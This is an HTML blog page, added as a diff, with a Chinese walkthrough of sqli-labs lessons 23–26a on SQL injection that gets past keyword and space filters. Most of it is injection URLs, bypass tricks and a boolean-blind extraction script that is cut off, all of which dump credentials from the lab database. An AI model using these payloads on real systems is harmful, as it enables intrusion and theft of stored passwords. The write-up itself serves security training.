@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        SQL注入-关键字过滤的注入 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/" />
+        </div>
+        <div class="name">
+            <i>小白</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-1"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-1"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-2"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-2"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-3"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-3"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-4"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-4"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-5"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-5"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-6"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-7"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-8"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-6"><span class="toc-text">0x02</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        SQL注入-关键字过滤的注入
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2022-02-08 23:40:16</span></span>
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>Less-23—Less-28a（Less-24除外）都是基于关键字过滤的注入，源码当中将<code>--，#，or，and</code>等关键字都过滤掉了，在这样的基础上进行 SQL注入。</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-23</strong></p>
+<p>由源码可以看到，接收到的<code>id</code>值将被函数<code>preg_replace()</code>进行过滤，若<code>id</code>值当中有<code>#和--</code>将被会替换为<code>&quot;&quot;</code>，以至于注释符不能使用。</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220208234828450.png" alt="image-20220208234828450"></p>
+<p>没过滤时报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=1&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220208235912625.png" alt="image-20220208235912625"></p>
+<p>过滤时报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-23/?id=1&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209000031064.png" alt="image-20220209000031064"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>探测注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-23/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>由于没有注释符，只能够将<code>sql</code>语句中的单引号闭合进行注入，这里回西安正常，注入成功。</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209000146410.png" alt="image-20220209000146410"></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-23/?id=-1&#x27; union select 1,2,&#x27;3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209001511727.png" alt="image-20220209001511727"></p>
+<p>爆库名和版本号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-23/?id=-1&#x27; union select 1,database(),&#x27;version()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-23/?id=-1&#x27; union select 1,version(),&#x27;3</span><br></pre></td></tr></table></figure>
+
+<p>由于第一条语句第三个字段闭合单引号后形成字符串被代入数据库执行，导致爆出的只是字符串，回显点只能利用第二个字段。</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209001713576.png" alt="image-20220209001713576"></p>
+<p>爆表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-23/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#x27;3</span><br></pre></td></tr></table></figure>
+
+<p>由于不能使用注释符，只能够在第二个回显字段进行嵌套子查询爆表名。</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209002320153.png" alt="image-20220209002320153"></p>
+<p>爆列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-23/?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#x27;3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209002936700.png" alt="image-20220209002936700"></p>
+<p>爆内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-23/?id=-1&#x27; union select 1,(select concat(username,&#x27;:&#x27;,password) from security.users limit 0,1),&#x27;3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209003131337.png" alt="image-20220209003131337"></p>
+<hr>
+<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-25</strong></p>
+<p>源码中，<code>id</code>值将<code>or</code>和<code>and</code>关键字进行了过滤：</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209123042616.png" alt="image-20220209123042616"></p>
+<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>1、绕过<code>or</code>和<code>and</code>一般思路：</p>
+<p>（1）大小写变形 <code>Or,OR,oR</code> </p>
+<p>（2）编码，<code>hex，urlencode</code> </p>
+<p>（3）内联注释<code>/*or*/</code> </p>
+<p>（4）利用符号 <code>and=&amp;&amp; or=||</code></p>
+<p>（5）双写绕过<code>oorr</code>,<code>aandnandd</code></p>
+<p>2、由于对空格的过滤，可以使用：</p>
+<p><code>%09 TAB 键（水平）</code> </p>
+<p><code>%0a 新建一行</code> </p>
+<p><code>%0c 新的一页</code> </p>
+<p><code>%0d return 功能</code> </p>
+<p><code>%0b TAB 键（垂直）</code> </p>
+<p><code>%a0 空格</code></p>
+<p>内联注释举例：</p>
+<p><strong>/* */ 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</strong>，如图：</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209124343808.png" alt="image-20220209124343808"></p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>这里使用<code>and=&amp;&amp; or=||</code>进行绕过：<br>判断注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25/?id=-1&#x27; || 1=1 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209125309356.png" alt="image-20220209125309356"></p>
+<p>判断字段数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25/?id=1&#x27; oorrder by 4--+</span><br></pre></td></tr></table></figure>
+
+<p>判断字段数时由于<code>order</code>字段有关键字<code>or</code>，这里使用双写绕过。</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209125448678.png" alt="image-20220209125448678"></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25/?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>爆库爆版本号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25/?id=-1&#x27; union select 1,database(),version()S--+</span><br></pre></td></tr></table></figure>
+
+<p>爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25/?id=-1&#x27; union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() limit 0,1),3--+</span><br></pre></td></tr></table></figure>
+
+<p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25/?id=-1&#x27; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; limit 0,1),3--+</span><br></pre></td></tr></table></figure>
+
+<p>爆内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25/?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from security.users--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-25a</strong></p>
+<p>源码中没有对<code>id</code>值做任何处理，这里使用双写绕过。</p>
+<p>这里还对报错回显进行了过滤，报错注入不能用。</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209131453709.png" alt="image-20220209131453709"></p>
+<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>判断注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25a/?id=1 aandnandd 1=1 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209131348169.png" alt="image-20220209131348169"></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-25a/?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209131643275.png" alt="image-20220209131643275"></p>
+<p>（<code>union</code>字段前面的语句不是为了报错，要使用正确的语法但不存在的字段）</p>
+<p>这里除了使用联合注入，还可以使用时间盲注和布尔盲注。</p>
+<hr>
+<h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-26</strong></p>
+<p>源码中过滤如下：</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209132949609.png" alt="image-20220209132949609"></p>
+<p>这里的思路应该是将Less-23和Less-25的payload结合一下即可。</p>
+<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>判断注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-26/?id=1&#x27; oorr &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209133231652.png" alt="image-20220209133231652"></p>
+<p>判断字段数：</p>
+<p>由于对空格的过滤，可以使用：</p>
+<p><code>%09 TAB 键（水平）</code> </p>
+<p><code>%0a 新建一行</code> </p>
+<p><code>%0c 新的一页</code> </p>
+<p><code>%0d return 功能</code> </p>
+<p><code>%0b TAB 键（垂直）</code> </p>
+<p><code>%a0 空格</code></p>
+<p>这些编码进行绕过，但由于window下apache解析的问题，这些编码都不能进行解析，导致绕过失败（可以放在linux平台下，这些编码都可进行绕过）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-26/?id=1&#x27;%0b oorrder%0bby%0b&#x27;4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209135200276.png" alt="image-20220209135200276"></p>
+<p>由于判断字段数或者联合注入这些payload都避免不了用到空格，所以这里使用报错注入。</p>
+<p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-26/?id=-1&#x27;||extractvalue(1,concat(0x7e,(database()),0x7e))||&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
+
+<p>这里使用双写绕过的话会使用到<code>空格</code>，所以，在使用<code>oorr</code>的地方使用<code>||</code>进行绕过</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209140223254.png" alt="image-20220209140223254"></p>
+<p>爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-26/?id=-1&#x27;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e))||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>这里爆表的时候由于不能使用空格，每一条查询语句只能够使用<code>()</code>来代替。</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209141154698.png" alt="image-20220209141154698"></p>
+<p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-26/?id=-1&#x27;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e))||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-26/?id=-1&#x27;||extractvalue(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e))||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-26/?id=-1&#x27;||extractvalue(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e))||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-26a</strong></p>
+<p>源码将报错过滤掉，导致报错注入失效：</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209144348906.png" alt="image-20220209144348906"></p>
+<h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><p>判断注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-26a/?id=1&#x27;)||(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209144158468.png" alt="image-20220209144158468"></p>
+<p>这里报错注入用不了，在windows平台下使用时间盲注或者布尔盲注进行注入，使用编码注入只能换到linux平台下进行，payload与以往相同。</p>
+<p>布尔盲注脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span>(<span class="params">char_index, <span class="built_in">ascii</span></span>):</span></span><br><span class="line">    <span class="comment"># 系统表中数据</span></span><br><span class="line">    info_database_name = <span class="string">&quot;infoorrmation_schema&quot;</span></span><br><span class="line">    info_table_name = <span class="string">&quot;schemata&quot;</span> <span class="comment"># schemata / tables / columns</span></span><br><span class="line">    info_column_name = <span class="string">&quot;schema_name&quot;</span> <span class="comment"># schema_name / table_name / column_name</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 注入表中数据</span></span><br><span class="line">    database_name = <span class="string">&quot;security&quot;</span></span><br><span class="line">    table_name = <span class="string">&quot;users&quot;</span></span><br><span class="line">    column_name = [<span class="string">&quot;id&quot;</span>,<span class="string">&quot;username&quot;</span>,<span class="string">&quot;passwoorrd&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 附加url</span></span><br><span class="line">    start_str = <span class="string">&quot;1&#x27;%26%26&quot;</span></span><br><span class="line">    end_str = <span class="string">&quot;||&#x27;1&#x27;=&#x27;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 连接select</span></span><br><span class="line">    where_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">#where_str = &quot;where(table_schema=&#x27;&quot;+database_name+&quot;&#x27;%26%26table_name=&#x27;&quot;+table_name+&quot;&#x27;)&quot;</span></span><br><span class="line">    select_str = <span class="string">&quot;select(group_concat(&quot;</span>+info_column_name+<span class="string">&quot;))from(&quot;</span>+info_database_name+<span class="string">&quot;.&quot;</span>+info_table_name+<span class="string">&quot;)&quot;</span>+where_str</span><br><span class="line">    <span class="comment">#select_str = &quot;select(group_concat(concat_ws(&#x27;$&#x27;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;)))from(&quot;+table_name+&quot;)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 连接payload</span></span><br><span class="line">    sqli_str = <span class="string">&quot;(ascii(mid((&quot;</span>+select_str+<span class="string">&quot;),&quot;</span>+<span class="built_in">str</span>(char_index)+<span class="string">&quot;,1))&gt;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ascii</span>)+<span class="string">&quot;)&quot;</span></span><br><span class="line">    payload = start_str + sqli_str + end_str</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span>(<span class="params">char_index, <span class="built_in">ascii</span></span>):</span></span><br><span class="line">    <span class="comment"># 连接url</span></span><br><span class="line">    url = <span class="string">&quot;http://localhost:8088/sqlilabs/Less-26/?id=&quot;</span></span><br><span class="line">    exec_url = url + getPayload(char_index, <span class="built_in">ascii</span>)</span><br><span class="line">    <span class="comment">#print(exec_url)</span></span><br><span class="line">    <span class="comment"># 检查回显</span></span><br><span class="line">    echo = <span class="string">&quot;Your Login name&quot;</span></span><br><span class="line">    content = requests.get(exec_url).text</span><br><span class="line">    <span class="keyword">if</span> echo <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dichotomy</span>(<span class="params">char_index, left, right</span>):</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment"># 二分法</span></span><br><span class="line">        <span class="built_in">ascii</span> = <span class="built_in">int</span>((left+right)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> execute(<span class="built_in">str</span>(char_index+<span class="number">1</span>), <span class="built_in">str</span>(<span class="built_in">ascii</span>)):</span><br><span class="line">            left = <span class="built_in">ascii</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = <span class="built_in">ascii</span></span><br><span class="line">        <span class="comment"># 结束二分</span></span><br><span class="line">        <span class="keyword">if</span> left == right-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> execute(<span class="built_in">str</span>(char_index+<span class="number">1</span>), <span class="built_in">str</span>(<span class="built_in">ascii</span>)):</span><br><span class="line">                <span class="built_in">ascii</span> += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ascii</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>): <span class="comment"># 查询结果的长度</span></span><br><span class="line">        char = dichotomy(<span class="built_in">len</span>, <span class="number">30</span>, <span class="number">126</span>) </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(char) == 